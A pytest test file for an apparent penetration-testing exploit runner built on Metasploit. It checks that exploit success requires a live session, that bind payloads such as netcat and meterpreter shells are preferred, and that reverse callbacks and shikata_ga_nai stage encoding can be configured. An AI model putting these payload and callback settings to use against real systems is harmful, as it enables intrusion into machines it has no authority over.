"""MSF exploits must HOLD a session, default to connect-out bind payloads, and be
operator-configurable (custom payload, encryption, external callback IP).

Run on demand:

    pytest tests/test_msf_payloads.py -v

WHY THIS EXISTS
---------------
Exploit modules reported success but no session ever held. Two defects:
  1. `success = bool(job_id or session_id)` counted a started handler JOB as a win
     even when no session opened — and modules ran with a default REVERSE payload
     to LHOST = the metasploit container's docker-internal IP, which a LAN target
     cannot route back to. So the callback never came, no session, false success.
  2. The by-id path never waited for or recorded the session, so even one that did
     open was invisible to etl/access.discover().
Now exploits default to a connect-OUT bind payload, the runner polls session.list
and records the real session id, and success requires an actual session. A custom
payload, stage encryption, and an external callback host are operator-settable.

SABOTAGE PROOF
--------------
Put `success = bool(job_id or session_id)` back into the exploit path and
test_exploit_success_requires_a_session fails. Make _pick_payload prefer reverse
and test_pick_payload_prefers_bind fails.
"""
import ast
import asyncio
import os
import sys

import pytest

REPO = os.path.realpath(os.path.join(os.path.dirname(__file__), ".."))
ERUNNER = os.path.join(REPO, "exploit_runner", "exploit_runner.py")
MSF_CLIENT = os.path.join(REPO, "exploit_runner", "msf_client.py")


def _src(path):
    if not os.path.exists(path):
        pytest.skip(f"{path} not present")
    return open(path, encoding="utf-8").read()


def _func(path, name):
    for node in ast.walk(ast.parse(_src(path))):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) and node.name == name:
            return ast.unparse(node)
    pytest.fail(f"{name} not found in {os.path.basename(path)}")


# ── Source guards (no import needed) ─────────────────────────────────────────

def test_exploit_success_requires_a_session():
    """The by-id MSF branch must judge an EXPLOIT by whether a session held, not
    by whether a handler job started, and must record the session id."""
    fn = _func(ERUNNER, "execute_by_id")
    assert "_build_exploit_options" in fn, "by-id no longer builds a payload (bind default)"
    assert "_await_new_session" in fn, "by-id no longer waits for the session to establish"
    assert "session_id=session_id" in fn, "by-id no longer records the session handle"
    assert "success = bool(session_id)" in fn, (
        "exploit success no longer requires an actual session")
    assert "auxiliary" in fn, "auxiliary modules are no longer typed apart from exploits"


def test_execute_msf_endpoint_records_and_waits():
    fn = _func(ERUNNER, "execute_msf_module")
    assert "_await_new_session" in fn, "/execute/msf no longer waits for the session"
    assert "session_id=" in fn, "/execute/msf no longer records the session handle"
    assert "_build_exploit_options" in fn, "/execute/msf no longer applies the bind-default payload config"


def test_client_can_list_compatible_payloads():
    assert "compatible_payloads" in _src(MSF_CLIENT), (
        "msf client can no longer enumerate a module's payloads (needed to pick bind)")


def test_payload_config_endpoints_exist_and_validate():
    src = _src(ERUNNER)
    assert '"/msf/payload-config"' in src or "'/msf/payload-config'" in src
    fn = _func(ERUNNER, "set_payload_config")
    # A reverse-only config with no reachable callback host can never connect
    # back — that must be rejected, not silently stored.
    assert "callback_host" in fn and "reverse" in fn


# ── Unit tests (skip cleanly if the runner's deps are absent here) ───────────

sys.path.insert(0, os.path.join(REPO, "exploit_runner"))
er = pytest.importorskip("exploit_runner", reason="exploit_runner deps not installed")


def test_default_connect_style_is_auto():
    assert er.MsfPayloadConfig().connect_style == "auto"
    assert er.MsfPayloadConfig().payload == ""


def test_pick_payload_prefers_bind_then_meterpreter():
    p, style = er._pick_payload(
        ["cmd/unix/reverse", "cmd/unix/bind_netcat", "java/meterpreter/bind_tcp"],
        "auto", "")
    assert style == "bind", (p, style)
    assert "bind" in p and "meterpreter" in p, p


def test_pick_payload_reverse_when_no_bind():
    p, style = er._pick_payload(["cmd/unix/reverse"], "auto", "")
    assert style == "reverse" and "reverse" in p, (p, style)


def test_pick_payload_custom_must_be_compatible():
    # honoured when compatible
    p, _ = er._pick_payload(["cmd/unix/bind_netcat", "x"], "auto", "cmd/unix/bind_netcat")
    assert p == "cmd/unix/bind_netcat"
    # ignored when not
    p2, _ = er._pick_payload(["only/this"], "auto", "cmd/unix/bind_netcat")
    assert p2 != "cmd/unix/bind_netcat"


class _FakeMsf:
    def __init__(self, payloads):
        self._p = payloads
    async def compatible_payloads(self, module):
        return self._p


def test_build_options_bind_default_sets_no_lhost():
    """A bind payload needs no callback address — the point for a NAT'd runner."""
    msf = _FakeMsf(["cmd/unix/bind_netcat", "cmd/unix/reverse"])
    cfg = er.MsfPayloadConfig()  # auto
    opts, payload, style = asyncio.run(
        er._build_exploit_options(msf, "exploit/x", "10.0.0.9", 445, cfg))
    assert style == "bind" and "LHOST" not in opts, opts
    assert opts.get("PAYLOAD") == "cmd/unix/bind_netcat"
    assert opts["LPORT"] and opts["RHOSTS"] == "10.0.0.9"


def test_build_options_reverse_uses_callback_and_encryption():
    msf = _FakeMsf(["cmd/unix/reverse"])
    cfg = er.MsfPayloadConfig(connect_style="reverse", callback_host="203.0.113.5",
                              callback_port=9001, encryption=True,
                              stage_encoder="x86/shikata_ga_nai")
    opts, payload, style = asyncio.run(
        er._build_exploit_options(msf, "exploit/x", "10.0.0.9", 445, cfg))
    assert style == "reverse"
    assert opts["LHOST"] == "203.0.113.5" and opts["LPORT"] == 9001
    assert opts.get("EnableStageEncoding") is True
    assert opts.get("StageEncoder") == "x86/shikata_ga_nai"
